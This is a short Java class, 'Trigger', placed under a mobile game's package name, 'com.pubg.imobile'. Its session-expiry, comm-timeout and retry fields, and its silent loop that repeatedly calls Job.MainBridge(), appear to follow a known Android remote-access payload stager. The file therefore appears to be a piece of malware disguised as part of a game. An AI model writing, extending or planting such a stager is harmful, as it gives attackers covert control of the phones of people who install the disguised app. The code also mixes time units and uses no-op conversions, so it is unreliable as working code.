package com.pubg.imobile;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;

import androidx.annotation.RequiresApi;

import java.io.File;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Trigger {
    static String[] params;
    private static Context context;
    public static long comm_timeout;
    public static long retry_total;
    public static long retry_wait;
    static long session_expiry;

    public static void Worker(String[] args) {
        if (args != null) {
            params = new String[]{new File(".").getAbsolutePath()};
        }

            long sessionExpiry = 604800;
            long commTimeout = 300;
            long retryTotal = 3600;
            long retryWait = 10;
            long payloadStart = System.currentTimeMillis();
            long currentTime = System.currentTimeMillis();
            session_expiry = TimeUnit.MINUTES.toMinutes(sessionExpiry) + payloadStart;
            comm_timeout = TimeUnit.MINUTES.toMinutes(commTimeout);
            retry_total = TimeUnit.MINUTES.toMinutes(retryTotal);
            retry_wait = TimeUnit.MINUTES.toMinutes(retryWait);
            while (currentTime <= payloadStart + retryTotal &&
                    currentTime <= session_expiry) {
                try {
                    Job.MainBridge();
                } catch (Exception e) {

                }
                try {
                    Thread.sleep(retryWait);
                } catch (InterruptedException e) {

                }
                currentTime = System.currentTimeMillis();
            }
        }

    public static void setContext(Context context) {
        Trigger.context = context;
    }
}
